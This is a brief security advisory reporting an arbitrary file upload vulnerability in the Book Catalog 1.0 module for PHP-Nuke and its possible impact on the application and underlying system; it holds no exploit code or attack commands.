The Book Catalog module for PHP-Nuke is prone to a vulnerability that lets attackers upload arbitrary files.

Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.

Book Catalog 1.0 is vulnerable; other versions may also be affected.
